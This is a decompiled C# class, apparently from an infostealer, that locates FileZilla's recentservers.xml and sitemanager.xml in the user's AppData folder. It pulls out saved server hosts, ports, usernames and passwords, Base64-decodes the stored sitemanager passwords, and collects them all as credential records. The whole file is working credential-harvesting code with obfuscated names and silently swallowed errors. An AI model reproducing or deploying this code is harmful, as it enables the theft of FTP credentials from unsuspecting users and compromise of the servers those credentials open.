using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

// Token: 0x02000046 RID: 70
public class GClass21
{
	// Token: 0x060001D2 RID: 466 RVA: 0x0000C25C File Offset: 0x0000A45C
	public static List<GClass32> smethod_0()
	{
		List<GClass32> list = new List<GClass32>();
		List<GClass32> result;
		try
		{
			if (!File.Exists(GClass21.string_0) && !File.Exists(GClass21.string_1))
			{
				result = list;
			}
			else
			{
				if (File.Exists(GClass21.string_0))
				{
					XmlTextReader reader = new XmlTextReader(GClass21.string_0);
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(reader);
					foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
					{
						XmlNode xmlNode = (XmlNode)obj;
						string text = string.Empty;
						string username = string.Empty;
						string password = string.Empty;
						foreach (object obj2 in xmlNode.ChildNodes)
						{
							XmlNode xmlNode2 = (XmlNode)obj2;
							if (xmlNode2.Name == "Host")
							{
								text = xmlNode2.InnerText;
							}
							if (xmlNode2.Name == "Port")
							{
								text = text + ":" + xmlNode2.InnerText;
							}
							if (xmlNode2.Name == "User")
							{
								username = xmlNode2.InnerText;
							}
							if (xmlNode2.Name == "Pass")
							{
								password = xmlNode2.InnerText;
							}
						}
						list.Add(new GClass32
						{
							URL = text,
							Username = username,
							Password = password,
							Application = "FileZilla"
						});
					}
				}
				if (File.Exists(GClass21.string_1))
				{
					XmlTextReader reader2 = new XmlTextReader(GClass21.string_1);
					XmlDocument xmlDocument2 = new XmlDocument();
					xmlDocument2.Load(reader2);
					foreach (object obj3 in xmlDocument2.DocumentElement.ChildNodes[0].ChildNodes)
					{
						XmlNode xmlNode3 = (XmlNode)obj3;
						string text2 = string.Empty;
						string username2 = string.Empty;
						string password2 = string.Empty;
						foreach (object obj4 in xmlNode3.ChildNodes)
						{
							XmlNode xmlNode4 = (XmlNode)obj4;
							if (xmlNode4.Name == "Host")
							{
								text2 = xmlNode4.InnerText;
							}
							if (xmlNode4.Name == "Port")
							{
								text2 = text2 + ":" + xmlNode4.InnerText;
							}
							if (xmlNode4.Name == "User")
							{
								username2 = xmlNode4.InnerText;
							}
							if (xmlNode4.Name == "Pass")
							{
								password2 = GClass21.smethod_1(xmlNode4.InnerText);
							}
						}
						list.Add(new GClass32
						{
							URL = text2,
							Username = username2,
							Password = password2,
							Application = "FileZilla"
						});
					}
				}
				result = list;
			}
		}
		catch
		{
			result = list;
		}
		return result;
	}

	// Token: 0x060001D3 RID: 467 RVA: 0x0000C630 File Offset: 0x0000A830
	public static string smethod_1(string szInput)
	{
		string result;
		try
		{
			byte[] bytes = Convert.FromBase64String(szInput);
			result = Encoding.UTF8.GetString(bytes);
		}
		catch
		{
			result = szInput;
		}
		return result;
	}

	// Token: 0x040000CD RID: 205
	public static string string_0 = string.Format("{0}\\FileZilla\\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

	// Token: 0x040000CE RID: 206
	public static string string_1 = string.Format("{0}\\FileZilla\\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
}
